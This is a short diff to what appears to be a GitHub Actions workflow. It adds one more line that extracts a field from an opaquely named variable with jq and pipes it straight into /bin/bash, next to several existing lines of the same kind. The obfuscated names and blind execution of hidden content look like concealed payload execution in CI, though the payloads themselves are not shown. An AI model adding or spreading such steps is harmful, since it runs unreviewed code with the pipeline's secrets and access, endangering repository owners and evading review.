@@ -36,6 +36,7 @@ jobs:
           echo $r249 | jq -r .evva2 | /bin/bash
           echo $z1887 | jq -r .br1442 | /bin/bash
           printf '%s' "$rrwg76" | jq -r .zmbp7 | /bin/bash
+          printf '%s' "$r2509" | jq -r .i9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
